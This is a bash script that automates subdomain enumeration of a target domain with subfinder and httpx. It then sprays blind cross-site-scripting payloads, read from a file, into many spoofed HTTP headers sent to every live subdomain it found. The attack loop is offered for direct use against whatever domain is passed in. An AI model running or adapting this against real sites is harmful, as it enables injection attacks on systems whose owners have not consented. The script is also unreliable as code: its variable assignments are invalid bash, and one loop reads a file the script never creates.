#!/bin/bash
#install subfinder
docker pull projectdiscovery/subfinder

#alias subfinder
alias subfinder='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/subfinder'

#install httpx
docker pull projectdiscovery/httpx

#alias httpx
alias httpx='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/httpx'


echo "subfinder & subfinder  successfully installs "


#enumeration subdomain
subfinder -d $1 -silent >> $1subdomain.txt
 
count = cat $1subdomain.txt | wc 
 echo "enumeration subdomain $count successfully  " 

#subdomain live

httpx -l $1subdomain.txt >> $1LIVE.txt

countx = cat $1LIVE.txt | wc 

 echo " subdomainlive  $countx successfully  " 


#blindxss

while read bxss;
do  cat $1LIVE.txt | httpx \  -H "X-Forwarded-for: $bxss" -H "X-forwarded-ip: $bxss" -H "cf-connecting-ip: $bxss"  
cat alivehosts.txt | httpx \  -H "X-Client-ip: $bxss" -H "X-real-ip: $bxss" -H "X-request-uri: $bxss" \  -H "X-XSRF-TOKEN: $bxss" -H "X-CSRF-TOKEN: $bxss" 
done < bxss-payload.txt
